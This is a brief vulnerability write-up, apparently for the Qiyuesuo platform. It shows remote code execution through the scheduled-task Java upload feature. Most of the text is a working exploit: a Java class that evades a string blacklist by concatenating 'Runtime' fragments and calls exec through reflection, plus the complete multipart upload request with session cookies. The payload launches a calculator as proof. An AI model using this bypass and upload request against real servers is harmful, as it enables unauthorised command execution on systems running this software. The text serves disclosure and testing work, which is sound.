
Visithttp://127.0.0.1:9181/timedtask?active=QIYUESUO

Add a scheduled task

![](https://gitee.com/nn0nkey/picture/raw/master/img/20250730162310.png)

Java files can be uploaded.

However, there are restrictions on blacklisted files.

![](https://gitee.com/nn0nkey/picture/raw/master/img/20250730162344.png)

Only string filtering, bypassing is simple

Use the following code

```php
package com.qiyuesuo.utask.java;

public class TEST extends BaseTimerTask {
    static final long serialVersionUID = 1L;

    @Override
    public void execute() {
        try {
            String cls = "java.lang.Ru" + "ntime";
            Class<?> clazz = Class.forName(cls);
            String a = "getRu" + "ntime";
            Object rt = clazz.getMethod(a).invoke(null);
            clazz.getMethod("exec", String.class).invoke(rt, "calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

```php
POST /api/code/upload HTTP/1.1
Host: 127.0.0.1:9181
Sec-Fetch-Dest: empty
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
Referer: http://127.0.0.1:9181/timedtaskedit
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryddTsKu3LDJO6V0BM
sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
Cookie: SID=e45cbd39-3471-46ad-b490-67ea1629260a; OSSID=6d8b88de-1d8f-4cd9-83d3-c24d86f491e1
X-Requested-With: XMLHttpRequest
Origin: http://127.0.0.1:9181
sec-ch-ua-mobile: ?0
Accept-Encoding: gzip, deflate, br, zstd
Content-Length: 826

------WebKitFormBoundaryddTsKu3LDJO6V0BM
Content-Disposition: form-data; name="type"

TIMETASK
------WebKitFormBoundaryddTsKu3LDJO6V0BM
Content-Disposition: form-data; name="file"; filename="TEST.java"
Content-Type: application/octet-stream

package com.qiyuesuo.utask.java;

public class TEST extends BaseTimerTask {
    static final long serialVersionUID = 1L;

    @Override
    public void execute() {
        try {
            String cls = "java.lang.Ru" + "ntime";
            Class<?> clazz = Class.forName(cls);
            String a = "getRu" + "ntime";
            Object rt = clazz.getMethod(a).invoke(null);
            clazz.getMethod("exec", String.class).invoke(rt, "calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

------WebKitFormBoundaryddTsKu3LDJO6V0BM--


```

![](https://gitee.com/nn0nkey/picture/raw/master/img/20250730162541.png)

Then select a cycle time of 10 seconds.

![](https://gitee.com/nn0nkey/picture/raw/master/img/20250730162651.png)

Successfully popping up the calculator causes RCE
